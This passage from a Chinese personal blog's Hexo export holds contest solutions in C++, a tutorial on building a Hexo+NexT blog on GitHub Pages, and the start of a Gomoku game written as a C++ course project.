<h2 id="E-Mo的游戏"><a href="#E-Mo的游戏" class="headerlink" title="E.Mo的游戏"></a>E.Mo的游戏</h2><p>题目链接: <a href="https://hpuoj.com/contest/16/problem/E/">https://hpuoj.com/contest/16/problem/E/</a><br>思路: $map$记录相同字符之间的最短距离,建一个数组记录此字符上次出现的位置.for循环遍历一遍即可.<br>代码:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include&lt;bits&#x2F;stdc++.h&gt;</span><br><span class="line">typedef long long ll;</span><br><span class="line">using namespace std;</span><br><span class="line">int a[200];</span><br><span class="line">int M[200];</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	string s;</span><br><span class="line">	memset(M,-1,sizeof(M));</span><br><span class="line">	cin&gt;&gt;s;</span><br><span class="line">	for(int i&#x3D;0;i&lt;s.length();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		if(M[s[i]]&#x3D;&#x3D;-1)</span><br><span class="line">		&#123;</span><br><span class="line">			M[s[i]]++;</span><br><span class="line">			a[s[i]]&#x3D;i+1;</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			if(M[s[i]]&#x3D;&#x3D;0)M[s[i]]&#x3D;i+1-a[s[i]];</span><br><span class="line">			if(i+1-a[s[i]]&lt;M[s[i]])</span><br><span class="line">				M[s[i]]&#x3D;i+1-a[s[i]];</span><br><span class="line">			a[s[i]]&#x3D;i+1;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	for(char i&#x3D;&#39;a&#39;;i&lt;&#x3D;&#39;z&#39;;i++)</span><br><span class="line">		if(M[i]&#x3D;&#x3D;0)cout&lt;&lt;i&lt;&lt;&#39;:&#39;&lt;&lt;0&lt;&lt;endl;</span><br><span class="line">		else if(M[i]!&#x3D;-1)cout&lt;&lt;i&lt;&lt;&#39;:&#39;&lt;&lt;s.length()-M[i]&lt;&lt;endl;</span><br><span class="line">	for(char i&#x3D;&#39;A&#39;;i&lt;&#x3D;&#39;Z&#39;;i++)</span><br><span class="line">		if(M[i]&#x3D;&#x3D;0)cout&lt;&lt;i&lt;&lt;&#39;:&#39;&lt;&lt;0&lt;&lt;endl;</span><br><span class="line">		else if(M[i]!&#x3D;-1)cout&lt;&lt;i&lt;&lt;&#39;:&#39;&lt;&lt;s.length()-M[i]&lt;&lt;endl;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="F-Mo的极限"><a href="#F-Mo的极限" class="headerlink" title="F.Mo的极限"></a>F.Mo的极限</h2><p>题目链接: <a href="https://hpuoj.com/contest/16/problem/F/">https://hpuoj.com/contest/16/problem/F/</a><br>思路: 思路暂无<br>代码:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">代码暂无</span><br></pre></td></tr></table></figure></p>
<h2 id="G-Mo的数学"><a href="#G-Mo的数学" class="headerlink" title="G.Mo的数学"></a>G.Mo的数学</h2><p>题目链接: <a href="https://hpuoj.com/contest/16/problem/G/">https://hpuoj.com/contest/16/problem/G/</a><br>思路: 分解质因数,即$M$的因子的倍数都不和$M$互质,其余的都和$M$互质,此为暴力做法.正解为容斥原理,暂无.<br>代码:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include&lt;bits&#x2F;stdc++.h&gt;</span><br><span class="line">#define MOD 1000000007</span><br><span class="line">typedef long long ll;</span><br><span class="line">using namespace std;</span><br><span class="line">bool zhi[1000020];</span><br><span class="line">int N,M;</span><br><span class="line">void gcd(int n)</span><br><span class="line">&#123;</span><br><span class="line">	for(int i&#x3D;2;i*i&lt;&#x3D;n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		if(n%i&#x3D;&#x3D;0)</span><br><span class="line">		&#123;</span><br><span class="line">			for(int j&#x3D;1;j*i&lt;&#x3D;N;j++)</span><br><span class="line">				zhi[i*j]&#x3D;1;</span><br><span class="line">			for(int j&#x3D;1;j*(n&#x2F;i)&lt;&#x3D;N;j++)</span><br><span class="line">				zhi[(n&#x2F;i)*j]&#x3D;1;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	for(int j&#x3D;1;j*n&lt;&#x3D;N;j++)</span><br><span class="line">		zhi[j*n]&#x3D;1;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	while(cin&gt;&gt;N&gt;&gt;M)</span><br><span class="line">	&#123;</span><br><span class="line">		ll ans&#x3D;1;</span><br><span class="line">		memset(zhi,0,sizeof(zhi));</span><br><span class="line">		gcd(M);</span><br><span class="line">		for(int i&#x3D;2;i&lt;&#x3D;N;i++)</span><br><span class="line">			if(!zhi[i])ans&#x3D;ans*i%MOD;</span><br><span class="line">		cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<h2 id="H-Mo的面积"><a href="#H-Mo的面积" class="headerlink" title="H.Mo的面积"></a>H.Mo的面积</h2><p>题目链接: <a href="https://hpuoj.com/contest/16/problem/H/">https://hpuoj.com/contest/16/problem/H/</a><br>思路: 两个矩形右边线中$x$值最小的减去两个矩形左边线中$x$值最大的即为重合矩形在$x$轴方向的长度;两个矩形上边线中$y$值最小的减去两个矩形下边线中$y$值最大的即为重合矩形在$y$轴方向的长度.如果其中一个值小于或等于0,则重合面积为0,否则,即为其乘积.求两矩形总面积减去重合部分面积即为答案.<br>代码:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include&lt;bits&#x2F;stdc++.h&gt;</span><br><span class="line">typedef long long ll;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	int a[2][2],b[2][2],x,y;</span><br><span class="line">	for(int i&#x3D;0;i&lt;2;i++)</span><br><span class="line">		for(int j&#x3D;0;j&lt;2;j++)</span><br><span class="line">			cin&gt;&gt;a[i][j];</span><br><span class="line">	for(int i&#x3D;0;i&lt;2;i++)</span><br><span class="line">	</span><br><span class="line">		for(int j&#x3D;0;j&lt;2;j++)</span><br><span class="line">			cin&gt;&gt;b[i][j];</span><br><span class="line">	x&#x3D;min(a[1][0],b[1][0])-max(a[0][0],b[0][0]);</span><br><span class="line">	y&#x3D;min(a[1][1],b[1][1])-max(a[0][1],b[0][1]);</span><br><span class="line">	int s&#x3D;(a[1][1]-a[0][1])*(a[1][0]-a[0][0])+(b[1][1]-b[0][1])*(b[1][0]-b[0][0]);</span><br><span class="line">	if(x*y&gt;0)s-&#x3D;x*y;</span><br><span class="line">	cout&lt;&lt;s&lt;&lt;endl;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="I-安全距离"><a href="#I-安全距离" class="headerlink" title="I.安全距离"></a>I.安全距离</h2><p>题目链接: <a href="https://hpuoj.com/contest/16/problem/I/">https://hpuoj.com/contest/16/problem/I/</a><br>思路: 思路暂无<br>代码:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">代码暂无</span><br></pre></td></tr></table></figure></p>
<h2 id="J-简单递归"><a href="#J-简单递归" class="headerlink" title="J.简单递归"></a>J.简单递归</h2><p>题目链接: <a href="https://hpuoj.com/contest/16/problem/J/">https://hpuoj.com/contest/16/problem/J/</a><br>思路: 讲题目代码递归转化为非递归即可.<br>代码:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include&lt;bits&#x2F;stdc++.h&gt;</span><br><span class="line">typedef long long ll;</span><br><span class="line">using namespace std;</span><br><span class="line">const int MOD &#x3D; (int)1e9 + 7;</span><br><span class="line">int a[1000020];</span><br><span class="line">void init()</span><br><span class="line">&#123;</span><br><span class="line">	a[1]&#x3D;a[2]&#x3D;1;</span><br><span class="line">	for(int i&#x3D;3;i&lt;&#x3D;1000000;i++)</span><br><span class="line">		a[i]&#x3D;((a[i-1]&lt;&lt;1)%MOD+(a[i-2]&gt;&gt;1)%MOD)%MOD;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	init();</span><br><span class="line">	int T,N;</span><br><span class="line">	cin&gt;&gt;T;</span><br><span class="line">	while(T--)</span><br><span class="line">	&#123;</span><br><span class="line">		cin&gt;&gt;N;</span><br><span class="line">		cout&lt;&lt;a[N]&lt;&lt;endl;</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="K-高度期望"><a href="#K-高度期望" class="headerlink" title="K.高度期望"></a>K.高度期望</h2><p>题目链接: <a href="https://hpuoj.com/contest/16/problem/K/">https://hpuoj.com/contest/16/problem/K/</a><br>思路: 贪心求解,先对树高进行排序,再从低到高遍历即可.<br>代码:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include&lt;bits&#x2F;stdc++.h&gt;</span><br><span class="line">typedef long long ll;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	int N,M,a[100020];</span><br><span class="line">	ll ans&#x3D;0,res&#x3D;0;</span><br><span class="line">	cin&gt;&gt;N&gt;&gt;M;</span><br><span class="line">	for(int i&#x3D;0;i&lt;N;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		cin&gt;&gt;a[i];</span><br><span class="line">		ans+&#x3D;a[i];</span><br><span class="line">	&#125;</span><br><span class="line">	sort(a,a+N);</span><br><span class="line">	for(int i&#x3D;0;i&lt;N;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		if(ans&gt;&#x3D;M*N)break;</span><br><span class="line">		ans+&#x3D;1000-a[i];</span><br><span class="line">		res++;</span><br><span class="line">	&#125;</span><br><span class="line">	cout&lt;&lt;res&lt;&lt;endl;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="L-最优规划"><a href="#L-最优规划" class="headerlink" title="L.最优规划"></a>L.最优规划</h2><p>题目链接: <a href="https://hpuoj.com/contest/16/problem/L/">https://hpuoj.com/contest/16/problem/L/</a><br>思路: 思路暂无<br>代码:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">代码暂无</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>题解</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo+NexT搭建博客</title>
    <url>/post/277d2a74/</url>
    <content><![CDATA[<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><h4 id="GitHub"><a href="#GitHub" class="headerlink" title="GitHub"></a>GitHub</h4><p>注册一个 GitHub 账号，创建一个新的仓库，仓库名称严格命名为<code>todest.github.io</code>，<code>todest</code>为用户名，修改成你自己的。</p>
<h4 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h4><p>从此处 <a href="https://git-scm.com/">Git官网</a> 下载并安装，右键打开<code>Git Bash</code>。<br><a id="more"></a></p>
<h5 id="配置SSH"><a href="#配置SSH" class="headerlink" title="配置SSH"></a>配置SSH</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;邮件地址&quot;</span>		<span class="comment"># 连续回车</span></span><br></pre></td></tr></table></figure>
<p>将<code>&quot;C:\Users\你的用户名\.ssh\id_rsa.pub&quot;</code>的内容复制下来，打开<code>GitHub设置-&gt;SSH and GPG keys-&gt;New SSH key</code>，粘贴到此处确定。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br><span class="line"><span class="comment"># 测试SSH是否配置好</span></span><br><span class="line"><span class="comment"># 看到You&#x27;ve successfully authenticated, but GitHub does not provide shell access.</span></span><br><span class="line"><span class="comment"># 则说明配置好了，否则无法使用hexo d</span></span><br></pre></td></tr></table></figure></p>
<h4 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h4><p>从 <a href="https://nodejs.org">Node.js官网</a> 下载安装。</p>
<h4 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure>
<p><code>install</code>可简写为 <code>i</code> 。</p>
<h4 id="初始化Hexo"><a href="#初始化Hexo" class="headerlink" title="初始化Hexo"></a>初始化Hexo</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo init Blog					<span class="comment"># Blog可以修改成其他的名字</span></span><br><span class="line"><span class="built_in">cd</span> Blog						<span class="comment"># 进入Blog文件夹</span></span><br></pre></td></tr></table></figure>
<h4 id="安装Hexo扩展"><a href="#安装Hexo扩展" class="headerlink" title="安装Hexo扩展"></a>安装Hexo扩展</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>
<h3 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h3><h4 id="本地调试"><a href="#本地调试" class="headerlink" title="本地调试"></a>本地调试</h4><p>以下<code>g</code>是<code>generate</code>的缩写，<code>s</code>是<code>start</code>的缩写，<code>d</code>是<code>deploy</code>的缩写。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g						<span class="comment"># 生成  此条和后一条可简写为 hexo s -g</span></span><br><span class="line">hexo s						<span class="comment"># 预览</span></span><br></pre></td></tr></table></figure><br><code>hexo s</code>是开启本地预览服务，打开浏览器访问 <a href="http://localhost:4000">http://localhost:4000</a> 即可看到内容。</p>
<h4 id="上传到GitHub-Pages"><a href="#上传到GitHub-Pages" class="headerlink" title="上传到GitHub Pages"></a>上传到GitHub Pages</h4><p>上传之前，打开站点配置文件<code>_config.yml</code>，位于站点根目录下，修改最后一部分为如下部分。<br><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repository:</span> <span class="string">git@github.com:todest/todest.github.io.git</span>    <span class="comment"># 修改为你的GitHub用户名</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure><br>上传到<code>GitHub Pages</code>。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g						<span class="comment"># 此条和后一条可简写为 hexo d -g</span></span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure></p>
<h4 id="修改主题"><a href="#修改主题" class="headerlink" title="修改主题"></a>修改主题</h4><p>主题位置<code>themes</code>目录下，默认为<code>landscape</code>主题。可从官网 <a href="https://hexo.io/themes/">https://hexo.io/themes/</a> 下载，推荐<code>NexT</code>主题，以下为安装方法。<br>安装过程就一行代码，站点根目录下运行。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/theme-next/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure><br>打开站点配置文件<code>_config.yml</code>，找到<code>theme： landscape</code>，修改为<code>next</code>就可以了。</p>
]]></content>
      <categories>
        <category>Web</category>
        <category>博客</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>NexT</tag>
      </tags>
  </entry>
  <entry>
    <title>五子棋</title>
    <url>/post/fc33752b/</url>
    <content><![CDATA[<blockquote>
<p>C++课程设计作业，包含人工智障$AI$</p>
</blockquote>
<a id="more"></a>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;graphics.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> pos[<span class="number">20</span>][<span class="number">20</span>];<span class="comment">//	1●		-1○		0×</span></span><br><span class="line"><span class="keyword">int</span> black[<span class="number">20</span>][<span class="number">20</span>], white[<span class="number">20</span>][<span class="number">20</span>];</span><br><span class="line"><span class="keyword">int</span> dir[<span class="number">4</span>][<span class="number">2</span>] = &#123; &#123;<span class="number">-1</span>,<span class="number">-1</span>&#125;,&#123;<span class="number">-1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">-1</span>,<span class="number">1</span>&#125;,&#123;<span class="number">0</span>,<span class="number">-1</span>&#125; &#125;;</span><br><span class="line"><span class="keyword">bool</span> key;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">End</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	setfont(<span class="number">80</span>, <span class="number">0</span>, <span class="string">&quot;宋体&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (n == <span class="number">1</span>)xyprintf(<span class="number">240</span>, <span class="number">245</span>, <span class="string">&quot;黑方获胜&quot;</span>);</span><br><span class="line">	<span class="keyword">else</span> xyprintf(<span class="number">240</span>, <span class="number">245</span>, <span class="string">&quot;白方获胜&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Checker</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	setcolor(EGERGB(<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; <span class="number">12</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; <span class="number">12</span>; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (pos[i][j])</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line">				<span class="keyword">for</span> (<span class="keyword">int</span> p = <span class="number">0</span>; p &lt; <span class="number">5</span>; p++)</span><br><span class="line">					<span class="keyword">if</span> (pos[i][j] != pos[i][j + p])</span><br><span class="line">					&#123;</span><br><span class="line">						flag = <span class="literal">false</span>;</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				<span class="keyword">if</span> (flag)</span><br><span class="line">				&#123;</span><br><span class="line">					line(i * <span class="number">40</span> + <span class="number">80</span>, j * <span class="number">40</span>, i * <span class="number">40</span> + <span class="number">80</span>, (j + <span class="number">4</span>) * <span class="number">40</span>);</span><br><span class="line">					End(pos[i][j]);</span><br><span class="line">					<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				flag = <span class="literal">true</span>;</span><br><span class="line">				<span class="keyword">for</span> (<span class="keyword">int</span> p = <span class="number">0</span>; p &lt; <span class="number">5</span>; p++)</span><br><span class="line">					<span class="keyword">if</span> (pos[i][j] != pos[i + p][j + p])</span><br><span class="line">					&#123;</span><br><span class="line">						flag = <span class="literal">false</span>;</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				<span class="keyword">if</span> (flag)</span><br><span class="line">				&#123;</span><br><span class="line">					line(i * <span class="number">40</span> + <span class="number">80</span>, j * <span class="number">40</span>, (i + <span class="number">4</span>) * <span class="number">40</span> + <span class="number">80</span>, (j + <span class="number">4</span>) * <span class="number">40</span>);</span><br><span class="line">					End(pos[i][j]);</span><br><span class="line">					<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				flag = <span class="literal">true</span>;</span><br><span class="line">				<span class="keyword">for</span> (<span class="keyword">int</span> p = <span class="number">0</span>; p &lt; <span class="number">5</span>; p++)</span><br><span class="line">					<span class="keyword">if</span> (pos[i][j] != pos[i + p][j])</span><br><span class="line">					&#123;</span><br><span class="line">						flag = <span class="literal">false</span>;</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				<span class="keyword">if</span> (flag)</span><br><span class="line">				&#123;</span><br><span class="line">					line(i * <span class="number">40</span> + <span class="number">80</span>, j * <span class="number">40</span>, (i + <span class="number">4</span>) * <span class="number">40</span> + <span class="number">80</span>, j * <span class="number">40</span>);</span><br><span class="line">					End(pos[i][j]);</span><br><span class="line">					<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">5</span>; i &lt;= <span class="number">15</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; <span class="number">12</span>; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (pos[i][j])</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line">				<span class="keyword">for</span> (<span class="keyword">int</span> p = <span class="number">0</span>; p &lt; <span class="number">5</span>; p++)</span><br><span class="line">					<span class="keyword">if</span> (pos[i][j] != pos[i - p][j + p])</span><br><span class="line">					&#123;</span><br><span class="line">						flag = <span class="literal">false</span>;</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				<span class="keyword">if</span> (flag)</span><br><span class="line">				&#123;</span><br><span class="line">					line(i * <span class="number">40</span> + <span class="number">80</span>, j * <span class="number">40</span>, (i - <span class="number">4</span>) * <span class="number">40</span> + <span class="number">80</span>, (j + <span class="number">4</span>) * <span class="number">40</span>);</span><br><span class="line">					End(pos[i][j]);</span><br><span class="line">					<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ChessBoard</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	setbkcolor(EGERGB(<span class="number">199</span>, <span class="number">156</span>, <span class="number">124</span>));</span><br><span class="line">	setcolor(EGERGB(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">120</span>; i &lt;= <span class="number">680</span>; i += <span class="number">40</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		line(<span class="number">120</span>, i - <span class="number">80</span>, <span class="number">680</span>, i - <span class="number">80</span>);	<span class="comment">//X	120-680</span></span><br><span class="line">		line(i, <span class="number">40</span>, i, <span class="number">600</span>);			<span class="comment">//Y	40-600</span></span><br><span class="line">	&#125;</span><br><span class="line">	setfillcolor(EGERGB(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">	bar(<span class="number">240</span> - <span class="number">4</span>, <span class="number">160</span> - <span class="number">4</span>, <span class="number">240</span> + <span class="number">4</span>, <span class="number">160</span> + <span class="number">4</span>);</span><br><span class="line">	bar(<span class="number">240</span> - <span class="number">4</span>, <span class="number">480</span> - <span class="number">4</span>, <span class="number">240</span> + <span class="number">4</span>, <span class="number">480</span> + <span class="number">4</span>);</span><br><span class="line">	bar(<span class="number">560</span> - <span class="number">4</span>, <span class="number">160</span> - <span class="number">4</span>, <span class="number">560</span> + <span class="number">4</span>, <span class="number">160</span> + <span class="number">4</span>);</span><br><span class="line">	bar(<span class="number">560</span> - <span class="number">4</span>, <span class="number">480</span> - <span class="number">4</span>, <span class="number">560</span> + <span class="number">4</span>, <span class="number">480</span> + <span class="number">4</span>);</span><br><span class="line">	bar(<span class="number">400</span> - <span class="number">4</span>, <span class="number">320</span> - <span class="number">4</span>, <span class="number">400</span> + <span class="number">4</span>, <span class="number">320</span> + <span class="number">4</span>);</span><br><span class="line">	setfont(<span class="number">10</span>, <span class="number">0</span>, <span class="string">&quot;黑体&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">40</span>; i &lt;= <span class="number">600</span>; i += <span class="number">40</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		xyprintf(<span class="number">100</span>, i - <span class="number">3</span>, <span class="string">&quot;%d&quot;</span>, (<span class="keyword">int</span>)(i / <span class="number">40</span>));</span><br><span class="line">		xyprintf(i + <span class="number">78</span>, <span class="number">20</span>, <span class="string">&quot;%c&quot;</span>, (<span class="keyword">char</span>)(i / <span class="number">40</span> + <span class="string">&#x27;A&#x27;</span> - <span class="number">1</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	setcolor(EGERGB(<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">	setfont(<span class="number">20</span>, <span class="number">0</span>, <span class="string">&quot;宋体&quot;</span>);</span><br><span class="line">	xyprintf(<span class="number">10</span>, <span class="number">40</span>, <span class="string">&quot;当前子数&quot;</span>);</span><br><span class="line">	setcolor(EGERGB(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">	xyprintf(<span class="number">10</span>, <span class="number">70</span>, <span class="string">&quot;黑: 0&quot;</span>);</span><br><span class="line">	setcolor(EGERGB(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>));</span><br><span class="line">	xyprintf(<span class="number">10</span>, <span class="number">100</span>, <span class="string">&quot;白: 0&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Chess</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> color)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (color % <span class="number">2</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		setcolor(EGERGB(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>));</span><br><span class="line">		setfillcolor(EGERGB(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>));</span><br><span class="line">		fillellipse(x, y, <span class="number">15</span>, <span class="number">15</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		setcolor(EGERGB(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">		setfillcolor(EGERGB(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">		fillellipse(x, y, <span class="number">15</span>, <span class="number">15</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Play</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> color)</span><span class="comment">//color: 0●  1○</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	x -= <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">if</span> (x &gt;= <span class="number">1</span> &amp;&amp; x &lt;= <span class="number">15</span> &amp;&amp; y &gt;= <span class="number">1</span> &amp;&amp; y &lt;= <span class="number">15</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (!pos[x][y])</span><br><span class="line">		&#123;</span><br><span class="line">			Chess(x * <span class="number">40</span> + <span class="number">80</span>, y * <span class="number">40</span>, color);</span><br><span class="line">			<span class="keyword">if</span> (color)pos[x][y] = <span class="number">-1</span>;</span><br><span class="line">			<span class="keyword">else</span> pos[x][y] = <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Counter</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	setfillcolor(EGERGB(<span class="number">199</span>, <span class="number">156</span>, <span class="number">124</span>));</span><br><span class="line">	bar(<span class="number">50</span>, <span class="number">60</span>, <span class="number">70</span>, <span class="number">120</span>);</span><br><span class="line">	<span class="keyword">if</span> (n % <span class="number">2</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		setcolor(EGERGB(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">		xyprintf(<span class="number">50</span>, <span class="number">70</span>, <span class="string">&quot;%d&quot;</span>, (n + <span class="number">1</span>) / <span class="number">2</span>);</span><br><span class="line">		setcolor(EGERGB(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>));</span><br><span class="line">		xyprintf(<span class="number">50</span>, <span class="number">100</span>, <span class="string">&quot;%d&quot;</span>, n / <span class="number">2</span>);</span><br><span class="line">		bar(<span class="number">0</span>, <span class="number">140</span>, <span class="number">100</span>, <span class="number">180</span>);</span><br><span class="line">		xyprintf(<span class="number">10</span>, <span class="number">150</span>, <span class="string">&quot;白方执棋&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		setcolor(EGERGB(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">		xyprintf(<span class="number">50</span>, <span class="number">70</span>, <span class="string">&quot;%d&quot;</span>, n / <span class="number">2</span>);</span><br><span class="line">		setcolor(EGERGB(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>));</span><br><span class="line">		xyprintf(<span class="number">50</span>, <span class="number">100</span>, <span class="string">&quot;%d&quot;</span>, (n + <span class="number">1</span>) 